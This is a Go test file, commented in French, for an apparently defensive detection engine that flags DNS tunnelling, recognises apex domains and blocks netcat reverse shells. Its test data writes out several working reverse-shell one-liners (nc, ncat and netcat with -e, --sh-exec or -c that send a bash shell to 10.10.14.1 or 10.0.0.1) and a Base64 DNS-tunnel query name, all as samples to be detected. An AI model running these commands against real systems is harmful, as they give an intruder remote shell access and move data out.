// Package engine — inference_cascade_reflex_test.go
// Réflexes structurels L0 (encodage DNS, netcat avec exécution), arbitrage du
// veto centroïde des domaines apex et bande suspecte sous bénignité certifiée.
package engine

import (
	"path/filepath"
	"testing"
)

func mountDNS(t *testing.T) *CascadeEngine {
	t.Helper()
	cascade := NewCascadeEngine(NewCodebook(nil), NewGrayZoneDecider(DefaultGrayZoneConfig()))
	disk, err := LoadFloppyMmap(filepath.Join(testWittgensteinDataDir(t), "floppies", "floppy_dns_c2.c2book"), WittgensteinFloppyKey(FloppyFamilyDNSC2))
	if err != nil {
		t.Fatalf("Impossible de charger floppy_dns_c2: %v", err)
	}
	t.Cleanup(func() { disk.Close() })
	cascade.MountFloppy(FloppyFamilyDNSC2, disk)
	return cascade
}

func TestDNSHasEncodingChars(t *testing.T) {
	for _, c := range []struct {
		qname string
		want  bool
	}{
		{"AAAAEJvcDJBf1CeJny7m48t0GablC1ia+6KCWg==.0.b.1.22713.tunnel.example.org.", true},
		{"abc/def.tunnel.example.org.", true},
		{"YWJj=.example.org.", true},
		{"forbesmiddleeast.com.", false},
		{"_dmarc.mail-01.example.co.uk.", false},
	} {
		if got := dnsHasEncodingChars([]byte(c.qname)); got != c.want {
			t.Errorf("dnsHasEncodingChars(%q) = %v, attendu %v", c.qname, got, c.want)
		}
	}
}

func TestIsApexDomain(t *testing.T) {
	for _, c := range []struct {
		name string
		want bool
	}{
		{"forbesmiddleeast.com.", true},
		{"sickbeard.com", true},
		{"minhacasamelhor.com.br.", true},
		{"terraempresas.COM.BR.", true},
		{"www.example.com.", false},
		{"a.b.example.org.", false},
		{"deep.example.com.br.", false},
		{"sub.example.fr.", false},
		{"com.", false},
		{"example..com.", false},
		{".example.com", false},
		{"exa_mple.com.", false},
		{"", false},
	} {
		if got := isApexDomain([]byte(c.name)); got != c.want {
			t.Errorf("isApexDomain(%q) = %v, attendu %v", c.name, got, c.want)
		}
	}
}

func TestNetcatWithExec(t *testing.T) {
	for _, c := range []struct {
		cmd  string
		want bool
	}{
		{"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445", true},
		{"nc 10.10.14.1 4444 -e /bin/sh", true},
		{"/bin/nc.traditional 10.0.0.1 9001 -e/bin/sh", true},
		{"ncat --sh-exec 'bash -i' 10.0.0.1 443", true},
		{"ncat --exec=/bin/sh 10.0.0.1 443", true},
		{"netcat -c bash 10.0.0.1 53", true},
		{"nc -nve /bin/sh 10.0.0.1 4444", true},
		{"nc -zv db01 5432", false},
		{"echo -e 'GET / HTTP/1.0\\r\\n' | nc web01 80", false},
		{"nc web01 80; grep -e error /var/log/syslog", false},
		{"ncdu -e /var", false},
		{"sync -c", false},
		{"openssl s_client -connect mail.example.com:993", false},
	} {
		if got := netcatWithExec([]byte(c.cmd)); got != c.want {
			t.Errorf("netcatWithExec(%q) = %v, attendu %v", c.cmd, got, c.want)
		}
	}
}

// Une session interactive root établie relève de l'axiome B1, mais un reverse
// shell netcat court reste bloqué en L0 sous toute session interactive, avant
// le raccourci de bénignité des charges courtes.
func TestInferenceCascade_InteractiveRootAndNetcatReflex(t *testing.T) {
	root := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 0, EUID: 0, LoginSession: true, HasTTY: true, ExeTarget: []byte("/usr/bin/bash")})
	if root != (CascadeContext{Subject: SubjRootInteractive, Context: CtxInteractiveTTY}) {
		t.Fatalf("session TTY root : %+v", root)
	}
	if got := EvaluateOntology(PackOntoKey(SubjRootInteractive, ActExecve, TgtBinSystem, CtxInteractiveTTY)); got != OntoVerdictAllow {
		t.Fatalf("axiome B1 en session root : %d, attendu Allow", got)
	}
	user := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 1000, EUID: 1000, LoginSession: true, HasTTY: true, ExeTarget: []byte("/usr/bin/bash")})

	cascade, _ := mountLOLBAS(t)
	for _, cmd := range []string{"nc 10.10.14.1 4444 -e /bin/bash", "nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445"} {
		var ev Probe_event_t
		ev.Subsystem, ev.Action = 1, 1
		cascade.arena.StorePayload(&ev, []byte(cmd))
		for _, cctx := range []CascadeContext{{}, user, root} {
			if v := cascade.EvaluateEventCtx(&ev, cctx); v.Action != VerdictBlock || v.Stage != StageL0 {
				t.Errorf("%q sous %+v : action=%d stage=%d ; attendu Block L0", cmd, cctx, v.Action, v.Stage)
			}
		}
	}
}

// La bande suspecte de Hamming ne met plus en quarantaine une commande
// d'administration sous bénignité ontologique certifiée ; sans provenance,
// elle continue de le faire.
func TestInferenceCascade_SuspectBandUnderCertifiedTTY(t *testing.T) {
	cascade, _ := mountLOLBAS(t)
	root := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 0, EUID: 0, LoginSession: true, HasTTY: true, ExeTarget: []byte("/usr/bin/bash")})
	var ev Probe_event_t
	ev.Subsystem, ev.Action = 1, 1
	cascade.arena.StorePayload(&ev, []byte("Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5"))
	if v := cascade.EvaluateEvent(&ev); v.Action != VerdictQuarantine || v.Stage != StageL1b {
		t.Fatalf("sans provenance : action=%d stage=%d ; attendu Quarantine L1b", v.Action, v.Stage)
	}
	if v := cascade.EvaluateEventCtx(&ev, root); v.Action != VerdictPass {
		t.Fatalf("session TTY root : action=%d stage=%d dist=%d ; attendu Pass", v.Action, v.Stage, v.HammingDist)
	}
}

// Un domaine apex certifié bénin par la tête échappe au veto centroïde ; un
// QNAME porteur d'encodage Base64 est bloqué en L0.
func TestInferenceCascade_DNSApexAndEncoding(t *testing.T) {
	cascade := mountDNS(t)
	for _, c := range []struct {
		qname  string
		action uint8
	}{
		{"sickbeard.com.", VerdictPass},
		{"minhacasamelhor.com.br.", VerdictPass},
		{"AAAAEJvcDJBf1CeJny7m48t0GablC1ia+6KCWg==.0.b.1.22713.tunnel.example.org.", VerdictBlock},
	} {
		var ev Probe_event_t
		ev.Subsystem, ev.Action = 3, 3
		cascade.arena.StorePayload(&ev, []byte(c.qname))
		if v := cascade.EvaluateEvent(&ev); v.Action != c.action {
			t.Errorf("%q : action=%d stage=%d dist=%d ; attendu %d", c.qname, v.Action, v.Stage, v.HammingDist, c.action)
		}
	}
}

func TestInferenceCascade_ReflexesZeroAlloc(t *testing.T) {
	dns := mountDNS(t)
	lolbas, _ := mountLOLBAS(t)
	root := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 0, EUID: 0, LoginSession: true, HasTTY: true, ExeTarget: []byte("/usr/bin/bash")})
	var apex, tunnel, shell, admin Probe_event_t
	apex.Subsystem, apex.Action = 3, 3
	tunnel.Subsystem, tunnel.Action = 3, 3
	shell.Subsystem, shell.Action = 1, 1
	admin.Subsystem, admin.Action = 1, 1
	dns.arena.StorePayload(&apex, []byte("minhacasamelhor.com.br."))
	dns.arena.StorePayload(&tunnel, []byte("AAAAEJvcDJBf1CeJny7m48t0GablC1ia+6KCWg==.0.b.1.22713.tunnel.example.org."))
	lolbas.arena.StorePayload(&shell, []byte("nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445"))
	lolbas.arena.StorePayload(&admin, []byte("Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5"))
	allocs := testing.AllocsPerRun(1000, func() {
		_ = dns.EvaluateEvent(&apex)
		_ = dns.EvaluateEvent(&tunnel)
		_ = lolbas.EvaluateEventCtx(&shell, root)
		_ = lolbas.EvaluateEventCtx(&admin, root)
	})
	if allocs != 0 {
		t.Fatalf("Réflexes AllocsPerRun = %.2f, attendu 0 (0 B/op)", allocs)
	}
}
